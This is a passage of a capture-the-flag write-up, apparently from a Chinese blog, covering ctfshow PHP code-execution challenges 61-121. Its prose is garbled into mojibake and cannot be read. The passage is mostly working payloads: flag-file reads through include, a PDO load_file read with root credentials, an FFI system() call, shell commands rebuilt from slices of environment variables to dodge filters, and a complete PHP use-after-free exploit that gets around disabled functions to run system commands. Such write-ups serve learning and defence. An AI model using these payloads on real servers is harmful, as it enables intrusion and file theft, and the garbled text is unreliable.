class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>ä¸Šä¸€é¢˜å¯ç”¨çš„æ–¹æ³•ä¹Ÿå¯</p><h5 id="61"><a href="#61" class="headerlink" title="61"></a>61</h5><p>åŒä¸Š</p><h5 id="62"><a href="#62" class="headerlink" title="62"></a>62</h5><pre class="line-numbers language-none"><code class="language-none">payload:POSTc&#x3D;include(&#39;flag.php&#39;);echo $flag;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>ä¸Šé¢æ‰€æœ‰æ–¹æ³•çš†å¯</p><h5 id="63"><a href="#63" class="headerlink" title="63"></a>63</h5><pre class="line-numbers language-none"><code class="language-none">payload:POSTc&#x3D;include(&#39;flag.php&#39;);var_dump(get_defined_vars());<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><code>get_defined_vars()</code>å¯è·å¾—æ‰€æœ‰å·²å®šä¹‰çš„å˜é‡ï¼Œå½“ä¸çŸ¥é“å˜é‡åæ—¶å¯ä½¿ç”¨è¿™ä¸ª</p><p>ä¸Šé¢æ–¹æ³•åŒæ ·ğŸ‰‘ï¸</p><h5 id="64"><a href="#64" class="headerlink" title="64"></a>64</h5><pre class="line-numbers language-none"><code class="language-none">payload:POSTc&#x3D;include(&#39;flag.php&#39;);echo $flag;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><code>scandir(&#39;.&#39;)</code>å¯ç”¨äºæ‰«ææ–‡ä»¶ï¼Œå’Œlsä¸€ä¸ªæ„æ€ï¼Œå½“æˆ‘ä»¬ä¸çŸ¥é“æ–‡ä»¶åæ—¶å¯ä½¿ç”¨</p><h5 id="65"><a href="#65" class="headerlink" title="65"></a>65</h5><p>åŒä¸Š</p><h5 id="66"><a href="#66" class="headerlink" title="66"></a>66</h5><p>![](<a href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-03-19">https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-03-19</a> 17.49.25.png)</p><p>å°è¯•å¤±è´¥è¿˜è¢«å˜²è®½äº†ï¼Œé¦–å…ˆæ‰«æä¸€ä¸‹æ–‡ä»¶ï¼Œå‘ç°æ ¹ç›®å½•ä¸‹æœ‰flag.txtï¼Œ<code>highlight_file(&#39;/flag.txt&#39;)</code>è¯»å–å³å¯</p><pre class="line-numbers language-none"><code class="language-none">payload:POSTc&#x3D;highlight_file(&#39;&#x2F;flag.txt&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h5 id="67"><a href="#67" class="headerlink" title="67"></a>67</h5><p>åŒä¸Š</p><h5 id="68"><a href="#68" class="headerlink" title="68"></a>68</h5><pre class="line-numbers language-none"><code class="language-none">payload:POSTc&#x3D;include(&#39;&#x2F;flag.txt&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>å±äºæ˜¯ç¦»è°±äº†ï¼Œç›´æ¥å°äº†<code>highlight_file</code>å‡½æ•°ï¼Œ<code>var_dump(scandir(&#39;/&#39;))</code>ï¼Œå‘ç°åœ¨æ ¹ç›®å½•ä¸­ï¼Œç›´æ¥includeæ–‡ä»¶ï¼Œæ²¡æœ‰phpæ ‡ç­¾å³ä¸ºç›´æ¥æ˜¾ç¤ºæºç ï¼Œç­‰äºç›´æ¥æ˜¾ç¤ºflag.txtçš„å†…å®¹</p><h5 id="69"><a href="#69" class="headerlink" title="69"></a>69</h5><p>åŒä¸Š</p><h5 id="70"><a href="#70" class="headerlink" title="70"></a>70</h5><p>ç»§ç»­ç™½å«–</p><h5 id="71"><a href="#71" class="headerlink" title="71"></a>71</h5><pre class="line-numbers language-none"><code class="language-none">payload:POSTc&#x3D;include(&#39;&#x2F;flag.txt&#39;);exit();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>å°è¯•ç™½å«–å‘ç°å¤±è´¥ï¼Œä¸‹è½½æºç è¿›è¡ŒæŸ¥çœ‹ï¼Œå‘ç°åœ¨è¾“å‡ºä¹‹å‰å°†ç¼“å†²åŒºä¸­çš„æ‰€æœ‰æ•°å­—å­—æ¯æ¢æˆäº†é—®å·ï¼Œé‚£ä¹ˆæˆ‘ä»¬è®©å®ƒåŒ…å«å®Œç›´æ¥é€€å‡ºå°±è¡Œäº†</p><h5 id="72"><a href="#72" class="headerlink" title="72"></a>72</h5><p>æ–‡ä»¶æ¢ä½ç½®äº†å“­å“­ï¼Œscandiræ‰¾ä¸åˆ°æ ¹ç›®å½•ï¼Œvar_dumpä¹Ÿæ²¡äº†ï¼Œå“­å“­</p><p>çœ‹æç¤º</p><p>é¦–å…ˆæ‰¾å‡ºæ–‡ä»¶å</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">payload:POSTc&#x3D;$a&#x3D;new DirectoryIterator(&quot;glob:&#x2F;&#x2F;&#x2F;*&quot;);foreach($a as $f)&#123;echo($f-&gt;__toString().&#39; &#39;);&#125; exit(0);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>![](<a href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-03-19">https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-03-19</a> 23.52.16.png)uafè„šæœ¬å¦‚ä¸‹</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">&lt;?phpfunction ctfshow($cmd) &#123;    global $abc, $helper, $backtrace;    class Vuln &#123;        public $a;        public function __destruct() &#123;             global $backtrace;             unset($this-&gt;a);            $backtrace &#x3D; (new Exception)-&gt;getTrace();            if(!isset($backtrace[1][&#39;args&#39;])) &#123;                $backtrace &#x3D; debug_backtrace();            &#125;        &#125;    &#125;    class Helper &#123;        public $a, $b, $c, $d;    &#125;    function str2ptr(&amp;$str, $p &#x3D; 0, $s &#x3D; 8) &#123;        $address &#x3D; 0;        for($j &#x3D; $s-1; $j &gt;&#x3D; 0; $j--) &#123;            $address &lt;&lt;&#x3D; 8;            $address |&#x3D; ord($str[$p+$j]);        &#125;        return $address;    &#125;    function ptr2str($ptr, $m &#x3D; 8) &#123;        $out &#x3D; &quot;&quot;;        for ($i&#x3D;0; $i &lt; $m; $i++) &#123;            $out .&#x3D; sprintf(&quot;%c&quot;,($ptr &amp; 0xff));            $ptr &gt;&gt;&#x3D; 8;        &#125;        return $out;    &#125;    function write(&amp;$str, $p, $v, $n &#x3D; 8) &#123;        $i &#x3D; 0;        for($i &#x3D; 0; $i &lt; $n; $i++) &#123;            $str[$p + $i] &#x3D; sprintf(&quot;%c&quot;,($v &amp; 0xff));            $v &gt;&gt;&#x3D; 8;        &#125;    &#125;    function leak($addr, $p &#x3D; 0, $s &#x3D; 8) &#123;        global $abc, $helper;        write($abc, 0x68, $addr + $p - 0x10);        $leak &#x3D; strlen($helper-&gt;a);        if($s !&#x3D; 8) &#123; $leak %&#x3D; 2 &lt;&lt; ($s * 8) - 1; &#125;        return $leak;    &#125;    function parse_elf($base) &#123;        $e_type &#x3D; leak($base, 0x10, 2);        $e_phoff &#x3D; leak($base, 0x20);        $e_phentsize &#x3D; leak($base, 0x36, 2);        $e_phnum &#x3D; leak($base, 0x38, 2);        for($i &#x3D; 0; $i &lt; $e_phnum; $i++) &#123;            $header &#x3D; $base + $e_phoff + $i * $e_phentsize;            $p_type  &#x3D; leak($header, 0, 4);            $p_flags &#x3D; leak($header, 4, 4);            $p_vaddr &#x3D; leak($header, 0x10);            $p_memsz &#x3D; leak($header, 0x28);            if($p_type &#x3D;&#x3D; 1 &amp;&amp; $p_flags &#x3D;&#x3D; 6) &#123;                 $data_addr &#x3D; $e_type &#x3D;&#x3D; 2 ? $p_vaddr : $base + $p_vaddr;                $data_size &#x3D; $p_memsz;            &#125; else if($p_type &#x3D;&#x3D; 1 &amp;&amp; $p_flags &#x3D;&#x3D; 5) &#123;                 $text_size &#x3D; $p_memsz;            &#125;        &#125;        if(!$data_addr || !$text_size || !$data_size)            return false;        return [$data_addr, $text_size, $data_size];    &#125;    function get_basic_funcs($base, $elf) &#123;        list($data_addr, $text_size, $data_size) &#x3D; $elf;        for($i &#x3D; 0; $i &lt; $data_size &#x2F; 8; $i++) &#123;            $leak &#x3D; leak($data_addr, $i * 8);            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;                $deref &#x3D; leak($leak);                                if($deref !&#x3D; 0x746e6174736e6f63)                    continue;            &#125; else continue;            $leak &#x3D; leak($data_addr, ($i + 4) * 8);            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;                $deref &#x3D; leak($leak);                                if($deref !&#x3D; 0x786568326e6962)                    continue;            &#125; else continue;            return $data_addr + $i * 8;        &#125;    &#125;    function get_binary_base($binary_leak) &#123;        $base &#x3D; 0;        $start &#x3D; $binary_leak &amp; 0xfffffffffffff000;        for($i &#x3D; 0; $i &lt; 0x1000; $i++) &#123;            $addr &#x3D; $start - 0x1000 * $i;            $leak &#x3D; leak($addr, 0, 7);            if($leak &#x3D;&#x3D; 0x10102464c457f) &#123;                return $addr;            &#125;        &#125;    &#125;    function get_system($basic_funcs) &#123;        $addr &#x3D; $basic_funcs;        do &#123;            $f_entry &#x3D; leak($addr);            $f_name &#x3D; leak($f_entry, 0, 6);            if($f_name &#x3D;&#x3D; 0x6d6574737973) &#123;                return leak($addr + 8);            &#125;            $addr +&#x3D; 0x20;        &#125; while($f_entry !&#x3D; 0);        return false;    &#125;    function trigger_uaf($arg) &#123;        $arg &#x3D; str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;);        $vuln &#x3D; new Vuln();        $vuln-&gt;a &#x3D; $arg;    &#125;    if(stristr(PHP_OS, &#39;WIN&#39;)) &#123;        die(&#39;This PoC is for *nix systems only.&#39;);    &#125;    $n_alloc &#x3D; 10;     $contiguous &#x3D; [];    for($i &#x3D; 0; $i &lt; $n_alloc; $i++)        $contiguous[] &#x3D; str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;);    trigger_uaf(&#39;x&#39;);    $abc &#x3D; $backtrace[1][&#39;args&#39;][0];    $helper &#x3D; new Helper;    $helper-&gt;b &#x3D; function ($x) &#123; &#125;;    if(strlen($abc) &#x3D;&#x3D; 79 || strlen($abc) &#x3D;&#x3D; 0) &#123;        die(&quot;UAF failed&quot;);    &#125;    $closure_handlers &#x3D; str2ptr($abc, 0);    $php_heap &#x3D; str2ptr($abc, 0x58);    $abc_addr &#x3D; $php_heap - 0xc8;    write($abc, 0x60, 2);    write($abc, 0x70, 6);    write($abc, 0x10, $abc_addr + 0x60);    write($abc, 0x18, 0xa);    $closure_obj &#x3D; str2ptr($abc, 0x20);    $binary_leak &#x3D; leak($closure_handlers, 8);    if(!($base &#x3D; get_binary_base($binary_leak))) &#123;        die(&quot;Couldn&#39;t determine binary base address&quot;);    &#125;    if(!($elf &#x3D; parse_elf($base))) &#123;        die(&quot;Couldn&#39;t parse ELF header&quot;);    &#125;    if(!($basic_funcs &#x3D; get_basic_funcs($base, $elf))) &#123;        die(&quot;Couldn&#39;t get basic_functions address&quot;);    &#125;    if(!($zif_system &#x3D; get_system($basic_funcs))) &#123;        die(&quot;Couldn&#39;t get zif_system address&quot;);    &#125;    $fake_obj_offset &#x3D; 0xd0;    for($i &#x3D; 0; $i &lt; 0x110; $i +&#x3D; 8) &#123;        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));    &#125;    write($abc, 0x20, $abc_addr + $fake_obj_offset);    write($abc, 0xd0 + 0x38, 1, 4);     write($abc, 0xd0 + 0x68, $zif_system);     ($helper-&gt;b)($cmd);    exit();&#125;ctfshow(&quot;cat &#x2F;flag0.txt&quot;);ob_end_flush();?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æœ€ç»ˆ</p><pre class="line-numbers language-none"><code class="language-none">payload:POSTc&#x3D;ä¸Šé¢çš„ä»£ç <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h5 id="73"><a href="#73" class="headerlink" title="73"></a>73</h5><p>includeå›æ¥é‡Œï¼Œflagc.txt</p><h5 id="74"><a href="#74" class="headerlink" title="74"></a>74</h5><pre class="line-numbers language-none"><code class="language-none">payload:POSTc&#x3D;include(&#39;&#x2F;flagx.txt&#39;);exit();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>é¦–å…ˆæ‰«ç›®å½•ï¼ŒåŒä¸Šé¢˜payloadï¼Œè€Œåå‘ç°åœ¨æ ¹ç›®å½•æœ‰flagx.txtå°è¯•åŒ…å«æˆåŠŸ</p><h5 id="75"><a href="#75" class="headerlink" title="75"></a>75</h5><p>banæ‰äº†open_basedirè®¿é—®æ–‡ä»¶çš„æ–¹å¼ï¼Œåªèƒ½é€šè¿‡åˆ«çš„æ–¹æ³•æ¥è®¿é—®æ–‡ä»¶ï¼Œå¯ä»¥é€šè¿‡mysqlè®¿é—®ï¼Œåœ¨å‰é¢å‡ é¢˜ä¸­å¯ä»¥æ‰¾åˆ°mysqlçš„è´¦å·å¯†ç ï¼Œæœ€ç»ˆpayloadå¦‚ä¸‹</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">payload:POSTc&#x3D;try &#123;  $dbh &#x3D; new PDO(&#39;mysql:host&#x3D;localhost;dbname&#x3D;ctftraining&#39;, &#39;root&#39;,&#39;root&#39;);  foreach($dbh-&gt;query(&#39;select load_file(&quot;&#x2F;flag36.txt&quot;)&#39;) as $row)&#123;    echo($row[0]);   &#125;  $dbh &#x3D; null;&#125;catch (PDOException $e) &#123;  echo $e-&gt;getMessage();  exit(0);&#125;exit(0);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ‹“å±•PDOçŸ¥è¯†ï¼š</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">PHP æ•°æ®å¯¹è±¡ ï¼ˆPDOï¼‰ æ‰©å±•ä¸ºPHPè®¿é—®æ•°æ®åº“å®šä¹‰äº†ä¸€ä¸ªè½»é‡çº§çš„ä¸€è‡´æ¥å£ã€‚PDO æä¾›äº†ä¸€ä¸ªæ•°æ®è®¿é—®æŠ½è±¡å±‚ï¼Œè¿™æ„å‘³ç€ï¼Œä¸ç®¡ä½¿ç”¨å“ªç§æ•°æ®åº“ï¼Œéƒ½å¯ä»¥ç”¨ç›¸åŒçš„å‡½æ•°ï¼ˆæ–¹æ³•ï¼‰æ¥æŸ¥è¯¢å’Œè·å–æ•°æ®ã€‚PDOéšPHP5.1å‘è¡Œï¼Œåœ¨PHP5.0çš„PECLæ‰©å±•ä¸­ä¹Ÿå¯ä»¥ä½¿ç”¨ï¼Œæ— æ³•è¿è¡Œäºä¹‹å‰çš„PHPç‰ˆæœ¬ã€‚ä¸€ä¸ªå®ä¾‹&lt;?php$dbms&#x3D;&#39;mysql&#39;;     &#x2F;&#x2F;æ•°æ®åº“ç±»å‹$host&#x3D;&#39;localhost&#39;; &#x2F;&#x2F;æ•°æ®åº“ä¸»æœºå$dbName&#x3D;&#39;test&#39;;    &#x2F;&#x2F;ä½¿ç”¨çš„æ•°æ®åº“$user&#x3D;&#39;root&#39;;      &#x2F;&#x2F;æ•°æ®åº“è¿æ¥ç”¨æˆ·å$pass&#x3D;&#39;&#39;;          &#x2F;&#x2F;å¯¹åº”çš„å¯†ç $dsn&#x3D;&quot;$dbms:host&#x3D;$host;dbname&#x3D;$dbName&quot;;try &#123;    $dbh &#x3D; new PDO($dsn, $user, $pass); &#x2F;&#x2F;åˆå§‹åŒ–ä¸€ä¸ªPDOå¯¹è±¡    echo &quot;è¿æ¥æˆåŠŸ&lt;br&#x2F;&gt;&quot;;    &#x2F;*ä½ è¿˜å¯ä»¥è¿›è¡Œä¸€æ¬¡æœç´¢æ“ä½œ    foreach ($dbh-&gt;query(&#39;SELECT * from FOO&#39;) as $row) &#123;        print_r($row); &#x2F;&#x2F;ä½ å¯ä»¥ç”¨ echo($GLOBAL); æ¥çœ‹åˆ°è¿™äº›å€¼    &#125;    *&#x2F;    $dbh &#x3D; null;&#125; catch (PDOException $e) &#123;    die (&quot;Error!: &quot; . $e-&gt;getMessage() . &quot;&lt;br&#x2F;&gt;&quot;);&#125;&#x2F;&#x2F;é»˜è®¤è¿™ä¸ªä¸æ˜¯é•¿è¿æ¥ï¼Œå¦‚æœéœ€è¦æ•°æ®åº“é•¿è¿æ¥ï¼Œéœ€è¦æœ€ååŠ ä¸€ä¸ªå‚æ•°ï¼šarray(PDO::ATTR_PERSISTENT &#x3D;&gt; true) å˜æˆè¿™æ ·ï¼š$db &#x3D; new PDO($dsn, $user, $pass, array(PDO::ATTR_PERSISTENT &#x3D;&gt; true));?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="76"><a href="#76" class="headerlink" title="76"></a>76</h5><p>åŒä¸Šæ”¹åå­—</p><h5 id="77"><a href="#77" class="headerlink" title="77"></a>77</h5><p>é¦–å…ˆè¿˜æ˜¯æ‰«ç›®å½•ï¼Œæ–‡ä»¶åflag36x.txtï¼Œå°è¯•ä¸Šé¢˜æ–¹æ³•å‘ç°æ•°æ®åº“æ¶ˆå¤±ï¼Œçœ‹æç¤ºæ˜¯PHP7.4ä»¥ä¸Šçš„æ–°ç‰¹æ€§ï¼Œå¯ä»¥é€šè¿‡æ–°å»ºä¸€ä¸ªFFIå¯¹è±¡æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œåˆå› ä¸ºæ‰§è¡Œç³»ç»Ÿå‘½ä»¤åæ²¡æœ‰å›æ˜¾ï¼Œæ‰€ä»¥æˆ‘ä»¬æŠŠæ‰§è¡Œåçš„ç»“æœæ”¾åˆ°ç½‘ç«™ç›®å½•ä¸‹çš„ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ä¸­è¿›è¡Œè¯»å–</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">payload<span class="token punctuation">:</span><span class="token constant">POST</span>c<span class="token operator">=</span><span class="token variable">$ffi</span> <span class="token operator">=</span> <span class="token class-name static-context">FFI</span><span class="token operator">::</span><span class="token function">cdef</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"int system(const char *command);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token string single-quoted-string">'/readflag > /var/www/html/1.txt'</span><span class="token punctuation">;</span><span class="token variable">$ffi</span><span class="token operator">-></span><span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç„¶åè®¿é—®/1.txtå³å¯</p><h5 id="118"><a href="#118" class="headerlink" title="118"></a>118</h5><p>é¦–å…ˆæŸ¥çœ‹æºç ï¼Œå‘ç°è¾“å…¥è¢«åŒ…å«åˆ°systemå‡½æ•°ä¸­æ‰§è¡Œï¼Œå°è¯•<code>echoï¼Œwhoamiï¼Œlsï¼Œcat</code>å…¨éƒ¨å¤±æ•ˆæƒ³æ–¹æ³•ç»•è¿‡ï¼Œè¾“å…¥ç©ºæ ¼å‘ç°å¯ä»¥æ‰§è¡Œï¼Œæ‰€ä»¥å¯ä»¥å°è¯•é€šè¿‡æ„é€ ç³»ç»Ÿå˜é‡æ¥æ‰§è¡Œï¼ŒæŸ¥çœ‹æç¤ºçš„å›¾ç‰‡</p><p>![](<a href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-03-21">https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-03-21</a> 16.39.03.png)</p><p>å‘ç°æ˜¯é»˜è®¤é…ç½®æ–‡ä»¶ä¸‹çš„æ–‡ä»¶ååˆ—è¡¨ï¼Œå¯ä»¥é€šè¿‡å‰ªè£æ„é€ å˜é‡ï¼Œè¯»å–æ–‡ä»¶å‘½ä»¤æœ€å®¹æ˜“è¿›è¡Œæ„é€ çš„å°±æ˜¯<code>nl</code>ï¼Œæƒ³æ‹¼æ¥å‡ºnlåªéœ€è¦å–ç³»ç»Ÿé…ç½®å˜é‡æœ€åä¸€ä½nå’Œå½“å‰æ‰§è¡Œç›®å½•æœ€åä¸€ä½lå³å¯ï¼Œæœ€ç»ˆpayloadå¦‚ä¸‹</p><pre class="line-numbers language-none"><code class="language-none">payload:$&#123;PATH:~0&#125;$&#123;PWD:~0&#125;$IFS????.???<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å‘ç°è¿˜æ˜¯ä¸è¡Œï¼Œæ˜¯å› ä¸ºè¿‡æ»¤äº†æ•°å­—ï¼Œæ²¡å…³ç³»ï¼Œå‰ªè£å­—ç¬¦è¿˜å¯é€šè¿‡å¤§å†™å­—æ¯è§£å†³ï¼ŒçœŸÂ·æœ€ç»ˆpayloadå¦‚ä¸‹</p><pre class="line-numbers language-none"><code class="language-none">payload:$&#123;PATH:~A&#125;$&#123;PWD:~A&#125;$IFS????.???<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>ç³»ç»Ÿå˜é‡è¡¥å……çŸ¥è¯†</strong></p><pre class="line-numbers language-none"><code class="language-none">$PATH ç³»ç»Ÿé…ç½®å˜é‡$PWD å½“å‰æ‰§è¡Œç›®å½•$HOME é»˜è®¤è¿›å…¥çš„ç›®å½•$SHELL$USER å½“å‰user$SHLVL ä»£è¡¨å½“å‰shellçª—å£çš„æ·±åº¦ï¼Œä¸€èˆ¬ä¸º1$PHP_CFLAGS æŒ‡å®šå¤´æ–‡ä»¶ï¼ˆ.hæ–‡ä»¶ï¼‰çš„è·¯å¾„ï¼Œå¦‚ï¼šCFLAGS&#x3D;-I&#x2F;usr&#x2F;include -I&#x2F;path&#x2F;includeã€‚åŒæ ·åœ°ï¼Œå®‰è£…ä¸€ä¸ªåŒ…æ—¶ä¼šåœ¨å®‰è£…è·¯å¾„ä¸‹å»ºç«‹ä¸€ä¸ªincludeç›®å½•ï¼Œå½“å®‰è£…è¿‡ç¨‹ä¸­å‡ºç°é—®é¢˜æ—¶ï¼Œè¯•ç€æŠŠä»¥å‰å®‰è£…çš„åŒ…çš„includeç›®å½•åŠ å…¥åˆ°è¯¥å˜é‡ä¸­æ¥ã€‚$PHP_VERSION PHPç‰ˆæœ¬<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>Linuxå˜é‡è¡¥å……çŸ¥è¯†</strong></p><pre class="line-numbers language-none"><code class="language-none">$&#123;å˜é‡å:ä»å“ªä¸€ä½å¼€å§‹å–:å–å¤šé•¿&#125;ï¼Œå¦‚æ²¡æœ‰é•¿åº¦é»˜è®¤å–åˆ°æœ€åï¼Œå¦‚æœæ²¡æœ‰èµ·å§‹ä½å°±ä»å¤´å¼€å§‹$&#123;#å˜é‡å&#125;ï¼Œä»£è¡¨è¿™ä¸ªå˜é‡çš„é•¿åº¦$<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h5 id="119"><a href="#119" class="headerlink" title="119"></a>119</h5><p>å…ˆå°è¯•ä¸Šä¸€æŠŠçš„æ˜¯å¦å¯è¡Œï¼Œä¸è¡Œæ‰€ä»¥ç›´æ¥çœ‹æç¤ºå§ï¼Œç³»ç»Ÿå˜é‡çš„çŸ¥è¯†è¡¥å……åœ¨ä¸Šä¸€é“é¢˜äº†ï¼Œé’ˆå¯¹æœ¬é¢˜</p><pre class="line-numbers language-none"><code class="language-none">SHLVLçš„å€¼ä¸º2ï¼Œ#SHLVLçš„å€¼ä¸º1ï¼Œä»PHP_VERSIONçš„ç¬¬äºŒä½å–ä¸€ä¸ªä¸º3ï¼Œä¹Ÿå°±æ˜¯$&#123;PHP_VERSION:$&#123;SHLVL&#125;:$&#123;#SHLVL&#125;&#125;ä¸º3ï¼Œæœ€ç»ˆå–PHP_CFLAGSå˜é‡ä»ç¬¬ä¸‰ä½å¼€å§‹çš„å‰ä¸‰ä¸ªå³å¯æ„é€ tac<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>æœ€ç»ˆpayloadå¦‚ä¸‹</p><pre class="line-numbers language-none"><code class="language-none">payload:$&#123;PHP_CFLAGS:$&#123;PHP_VERSION:$&#123;SHLVL&#125;:$&#123;#SHLVL&#125;&#125;:$&#123;PHP_VERSION:$&#123;SHLVL&#125;:$&#123;#SHLVL&#125;&#125;&#125; ????.???<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="120"><a href="#120" class="headerlink" title="120"></a>120</h5><p>ä¸Šä¸€æŠŠçš„å­—ç¬¦å¤ªé•¿äº†ï¼Œåªèƒ½é€šè¿‡åˆ«çš„å‘½ä»¤è¯»å–äº†</p><pre class="line-numbers language-none"><code class="language-none">tipsï¼šLinuxä¸­çš„base64åœ¨&#x2F;binç›®å½•ä¹‹ä¸‹ï¼Œbase64 æ–‡ä»¶åå³å¯å°†æ–‡ä»¶è¿›è¡Œbase64ç¼–ç <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ‰€ä»¥æˆ‘ä»¬æœ€ç»ˆæ„é€ å‡ºç»“æœä¸º/bin/base64 flag.phpå³å¯</p><p>é¦–å…ˆæ˜¯/å­—ç¬¦ï¼ŒPWDé¦–ä½ï¼Œè€Œåbinå¯ä½¿ç”¨é€šé…ç¬¦ï¼Œå°è¯•base64ä¹Ÿä½¿ç”¨é€šé…ç¬¦ä¸å¯è¡Œï¼Œæ‰€ä»¥æˆ‘ä»¬å°è¯•æ„å»ºå‡ºæ•°å­—4æ¥åŒ¹é…</p><pre class="line-numbers language-none"><code class="language-none">tipsï¼šRANDOMå˜é‡èƒ½ç”Ÿæˆä¸€ä¸‡ä»¥å†…çš„éšæœºæ•°ï¼Œç”¨#å–é•¿åº¦å³å¯æœ‰æ¦‚ç‡å¾—åˆ°4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æœ€ç»ˆpayload</p><pre class="line-numbers language-none"><code class="language-none">payload:POSTcode&#x3D;$&#123;PWD::$&#123;#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;?????$&#123;#RANDOM&#125; ????.???<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><del>å¤šåˆ·æ–°å‡ æ¬¡æ€»ä¼šå‡ºæ¥çš„</del></p><p>![](<a href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-03-21">https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-03-21</a> 19.36.51.png)</p><h5 id="121"><a href="#121" class="headerlink" title="121"></a>121</h5><p>å°è¯•ä¸Šé¢˜payloadï¼Œå‘ç°SHLVLè¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¸€ä¸ª1</p><pre class="line-numbers language-none"><code class="language-none">tips:é€šè¿‡$?æ¥å®ç°çš„ï¼Œ$?æ˜¯è¡¨ç¤ºä¸Šä¸€æ¡å‘½ä»¤æ‰§è¡Œç»“æŸåçš„ä¼ 